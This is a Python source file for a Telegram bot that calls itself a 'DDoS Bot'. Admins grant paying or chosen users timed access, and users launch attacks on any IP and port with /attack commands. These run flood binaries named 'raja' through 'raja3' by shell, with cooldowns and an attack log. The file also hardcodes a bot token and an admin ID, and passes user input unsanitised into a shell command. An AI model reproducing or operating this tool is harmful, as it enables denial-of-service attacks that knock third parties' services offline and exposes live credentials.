import os
import subprocess
import threading
import json
from datetime import datetime, timedelta
from telegram import Update, ParseMode
from telegram.ext import Updater, CommandHandler, CallbackContext

# Admins and data storage
admins = [7855020275]
user_data = {}
attack_history = {}
attack_cooldowns = {}
COOLDOWN_DURATION = 300  # Cooldown time in seconds

USER_FILE = "users.json"

# Load user data
if os.path.exists(USER_FILE):
    with open(USER_FILE, "r") as f:
        user_data = json.load(f)

def save_data():
    with open(USER_FILE, "w") as f:
        json.dump(user_data, f)

def start(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if not is_user_expired(user_id):
        update.message.reply_text("🌟 Welcome to the **DDoS Bot**! 🌟\nUse /help to see available commands.")
    else:
        update.message.reply_text("⏳ Your access has expired. Please contact an admin.")

def help_command(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if not is_user_expired(user_id):
        update.message.reply_text("📜 **Available Commands:**\n\n"
                                  "🔗 /attack <ip> <port> <time> - Start an attack using binary_attack\n"
                                  "🔗 /attack1 <ip> <port> <time> - Start an attack using binary_attack1\n"
                                  "🔗 /attack2 <ip> <port> <time> - Start an attack using binary_attack2\n"
                                  "🔗 /attack3 <ip> <port> <time> - Start an attack using binary_attack3\n"
                                  "⏳ /cooldown - Check remaining cooldown time\n"
                                  "➕ /adduser <user_id> <duration> <min/days> - Add a user with timed access\n"
                                  "➖ /removeuser <user_id> - Remove a user\n"
                                  "📈 /show_attack - View attack history\n")
    else:
        update.message.reply_text("⏳ Your access has expired. Please contact an admin.")

def add_user(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("❌ You do not have permission to use this command.")
        return

    try:
        target_id = int(context.args[0])
        duration = int(context.args[1])
        unit = context.args[2].lower()

        if unit == 'days':
            expiry_time = datetime.now() + timedelta(days=duration)
        elif unit == 'min':
            expiry_time = datetime.now() + timedelta(minutes=duration)
        else:
            update.message.reply_text("❌ Invalid unit. Use 'min' for minutes or 'days' for days.")
            return

        expiry_str = expiry_time.strftime("%Y-%m-%d %H:%M:%S")
        user_data[target_id] = {"expiry": expiry_str}
        save_data()
        update.message.reply_text(f"✅ User **{target_id}** added with access until **{expiry_str}**.")
    except (IndexError, ValueError):
        update.message.reply_text("❌ Usage: /adduser <user_id> <duration> <min/days>")

def remove_user(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("❌ You do not have permission to use this command.")
        return

    try:
        target_id = int(context.args[0])
        if target_id in user_data:
            del user_data[target_id]
            save_data()
            update.message.reply_text(f"🗑️ User **{target_id}** has been removed.")
        else:
            update.message.reply_text("❌ User not found.")
    except (IndexError, ValueError):
        update.message.reply_text("❌ Usage: /removeuser <user_id>")

def is_user_expired(user_id):
    if user_id in user_data:
        expiry_time = datetime.strptime(user_data[user_id]['expiry'], "%Y-%m-%d %H:%M:%S")
        if expiry_time > datetime.now():
            return False  # Not expired
        else:
            del user_data[user_id]  # Remove expired user
            save_data()
            return True  # Expired
    return True  # Not found, treat as expired

def start_attack_generic(update: Update, context: CallbackContext, binary_name: str) -> None:
    user_id = update.effective_user.id
    if is_user_expired(user_id):
        update.message.reply_text("⏳ Your access has expired. Please contact an admin.")
        return

    # Cooldown check
    if user_id in attack_cooldowns:
        last_attack_time = attack_cooldowns[user_id]
        elapsed_time = (datetime.now() - last_attack_time).total_seconds()
        if elapsed_time < COOLDOWN_DURATION:
            remaining_time = COOLDOWN_DURATION - elapsed_time
            update.message.reply_text(f"⏳ You're on cooldown. Please wait **{int(remaining_time)} seconds** before attacking again.")
            return

    try:
        ip = context.args[0]
        port = context.args[1]
        duration = int(context.args[2])

        # Notify attack started
        expiry_time = datetime.strptime(user_data[user_id]['expiry'], "%Y-%m-%d %H:%M:%S")
        remaining_time = expiry_time - datetime.now()

        update.message.reply_text(f"🚀 **Attack Initiated** 🚀\n\n"
                                  f"🖥️ **Target:** `{ip}`\n"
                                  f"🔌 **Port:** `{port}`\n"
                                  f"⏲️ **Duration:** `{duration} seconds`\n"
                                  f"📅 **Access Valid Until:** `{expiry_time.strftime('%Y-%m-%d %H:%M:%S')}`\n"
                                  f"⏳ **Access Remaining:** `{str(remaining_time).split('.')[0]}`")

        command = f"./{binary_name} {ip} {port} {duration} 900"
        process = subprocess.Popen(command, shell=True)

        # Record attack in history and update cooldown
        attack_history.setdefault(str(user_id), []).append({"binary": binary_name, "ip": ip, "port": port, "time": duration, "start_time": str(datetime.now())})
        attack_cooldowns[user_id] = datetime.now()  # Start cooldown
        save_data()

        def end_attack():
            process.kill()
            update.message.reply_text(f"✅ **Attack Finished Successfully** ✅\n\n"
                                      f"🖥️ **Target:** `{ip}`\n"
                                      f"🔌 **Port:** `{port}`\n"
                                      f"⏲️ **Duration:** `{duration} seconds`")

        timer = threading.Timer(duration, end_attack)
        timer.start()

    except (IndexError, ValueError):
        update.message.reply_text("❌ Usage: /attack <ip> <port> <time>")

# Individual handlers for each binary
def start_attack(update: Update, context: CallbackContext) -> None:
    start_attack_generic(update, context, "raja")

def start_attack1(update: Update, context: CallbackContext) -> None:
    start_attack_generic(update, context, "raja1")

def start_attack2(update: Update, context: CallbackContext) -> None:
    start_attack_generic(update, context, "raja2")

def start_attack3(update: Update, context: CallbackContext) -> None:
    start_attack_generic(update, context, "raja3")

def check_cooldown(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id

    if user_id in attack_cooldowns:
        last_attack_time = attack_cooldowns[user_id]
        elapsed_time = (datetime.now() - last_attack_time).total_seconds()
        if elapsed_time < COOLDOWN_DURATION:
            remaining_time = COOLDOWN_DURATION - elapsed_time
            update.message.reply_text(f"⏳ Cooldown in progress. **{int(remaining_time)} seconds** remaining.")
        else:
            update.message.reply_text("✅ No cooldown. You can attack now.")
    else:
        update.message.reply_text("❌ You have not initiated any attacks yet.")

def show_attacks(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("❌ You do not have permission to use this command.")
        return

    message = "📈 **Attack History (Last 24 hours):**\n"
    now = datetime.now()
    for uid, attacks in attack_history.items():
        attacks_in_24h = [a for a in attacks if (now - datetime.strptime(a['start_time'], "%Y-%m-%d %H:%M:%S.%f")).total_seconds() < 86400]
        message += f"👤 **User ID:** {uid}, **Number of Attacks:** {len(attacks_in_24h)}\n"
    
    update.message.reply_text(message)

def main():
    updater = Updater("7630314402:AAHggWxqMD7vetT2HicGAjs2G_cEBIFxfN0", use_context=True)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("help", help_command))
    dispatcher.add_handler(CommandHandler("adduser", add_user))
    dispatcher.add_handler(CommandHandler("removeuser", remove_user))
    dispatcher.add_handler(CommandHandler("attack", start_attack))
    dispatcher.add_handler(CommandHandler("attack1", start_attack1))
    dispatcher.add_handler(CommandHandler("attack2", start_attack2))
    dispatcher.add_handler(CommandHandler("attack3", start_attack3))
    dispatcher.add_handler(CommandHandler("check_cooldown", check_cooldown))
    dispatcher.add_handler(CommandHandler("show_attack", show_attacks))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
